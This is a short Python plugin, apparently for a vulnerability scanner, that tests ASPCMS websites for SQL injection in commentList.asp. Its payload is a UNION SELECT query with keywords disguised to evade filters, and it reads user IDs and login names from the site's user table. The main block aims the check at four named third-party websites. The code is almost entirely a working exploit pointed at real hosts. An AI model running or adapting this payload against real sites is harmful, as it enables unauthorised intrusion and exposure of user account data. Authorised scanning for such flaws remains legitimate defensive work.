#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 拿破轮胎
#_PlugName_ = ASPCMS SQL注入
import re
def assign(service, arg):
    if service == 'aspcms':
        return True, arg
def audit(arg):
    payload = 'plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,0x74%2b0x65%2b0x73%2b0x74%2b0x76%2b0x75%2b0x6c,now%28%29,null,1%20%20frmasterom%20{prefix}user'
    target = arg + payload
    
    code, head, res, errcode, _ = curl.curl2(target);
    if code==200 and "testvul" in res:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('aspcms', 'http://asp012.qy.scgckj.com/')[1])
    audit(assign('aspcms', 'http://hwaway.net.cn/')[1])
    audit(assign('aspcms', 'http://www.hntgjt.com/')[1])
    audit(assign('aspcms', 'http://www.qianlan.com.cn/')[1])